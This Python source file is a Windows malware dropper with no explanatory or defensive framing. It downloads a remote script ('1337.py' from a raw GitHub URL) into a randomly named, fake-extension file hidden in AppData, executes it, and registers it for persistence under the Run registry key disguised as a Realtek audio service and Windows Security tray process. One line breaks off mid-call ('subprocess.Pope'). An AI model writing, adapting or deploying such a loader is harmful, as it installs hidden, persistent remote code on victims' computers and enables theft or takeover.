from sys import executable
from urllib import request
import os
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice
from shutil import copy
import subprocess
from os import getenv, listdir, startfile

if name != 'nt': 
    exit()

os.system("python.exe -m pip install --upgrade pip")

#requirements
requirements = [
    ["wmi", "wmi"],
    ["Crypto.Cipher", "pycryptodome"],
    ["uplink", "uplink"],
    ["requests", "requests"],
    ["httpx", "httpx"],
    ["alive-progress", "alive-progress"],
    ["psutil", "psutil"],
    ["cryptography", "cryptography"],
    ["pypiwin32", "pypiwin32"],
    ["Pillow", "Pillow"],
    ["copy", "copy"],
    ["webbrowser", "webbrowser"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Pope

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")



DoYouKnowTheWay = getPath() + '\\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
try:
    startUP(DoYouKnowTheWay)
except:
    pass